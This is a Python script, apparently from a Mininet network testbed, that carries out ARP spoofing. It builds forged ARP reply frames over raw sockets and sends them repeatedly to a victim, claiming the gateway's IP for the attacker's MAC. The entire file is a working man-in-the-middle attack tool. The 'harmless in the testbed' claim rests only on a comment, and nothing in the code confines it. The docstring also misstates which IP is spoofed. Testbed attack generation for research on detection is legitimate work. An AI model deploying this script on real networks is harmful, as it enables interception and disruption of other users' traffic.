#!/usr/bin/env python3
"""
ARP spoofing attack for the testbed: sends forged ARP replies claiming the
victim's IP belongs to our MAC (the classic man-in-the-middle primitive).
Uses raw sockets so no extra package is needed inside Mininet hosts.

    python3 arp_spoof.py --iface h9-eth0 --victim-ip 10.0.0.10 \
        --gateway-ip 10.0.0.100 --count 8 --interval 0.5

Harmless in the testbed: packets are forged ARP only; no traffic is actually relayed.
"""

import argparse
import socket
import struct
import time


def mac_bytes(iface):
    with open(f"/sys/class/net/{iface}/address") as f:
        return bytes(int(x, 16) for x in f.read().strip().split(":"))


def ip_bytes(ip):
    return socket.inet_aton(ip)


def arp_reply(src_mac, src_ip, dst_mac, dst_ip):
    eth = dst_mac + src_mac + struct.pack("!H", 0x0806)
    arp = struct.pack("!HHBBH", 1, 0x0800, 6, 4, 2)  # htype, ptype, hlen, plen, op=reply
    arp += src_mac + ip_bytes(src_ip) + dst_mac + ip_bytes(dst_ip)
    return eth + arp


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--iface", required=True)
    ap.add_argument("--victim-ip", required=True)
    ap.add_argument("--victim-mac", default="ff:ff:ff:ff:ff:ff")
    ap.add_argument("--gateway-ip", required=True, help="IP we fraudulently claim to own")
    ap.add_argument("--count", type=int, default=8)
    ap.add_argument("--interval", type=float, default=0.5)
    a = ap.parse_args()

    src_mac = mac_bytes(a.iface)
    dst_mac = bytes(int(x, 16) for x in a.victim_mac.split(":"))
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    s.bind((a.iface, 0))
    frame = arp_reply(src_mac, a.gateway_ip, dst_mac, a.victim_ip)
    for _ in range(a.count):
        s.send(frame)
        time.sleep(a.interval)
    s.close()


if __name__ == "__main__":
    main()
